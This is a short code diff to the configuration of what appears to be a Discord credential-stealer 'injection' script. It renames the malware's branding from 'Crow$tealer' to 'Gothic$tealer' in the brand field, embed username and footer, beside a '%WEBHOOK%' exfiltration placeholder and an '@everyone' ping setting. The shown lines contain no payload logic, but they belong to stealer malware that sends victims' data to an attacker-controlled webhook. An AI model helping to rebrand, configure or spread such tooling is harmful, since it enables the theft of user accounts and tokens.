@@ -10,7 +10,7 @@ const fs = require("fs");
 
 
 var config = {
-    brand: "Crow",
+    brand: "Gothic",
 
     webhook: "%WEBHOOK%",
 
@@ -22,9 +22,9 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "Crow$tealer | Injection",
+        username: "Gothic$tealer | Injection",
         footer: {
-            text: `@crow$tealer`,
+            text: `@Gothic$tealer`,
         },
     },
 
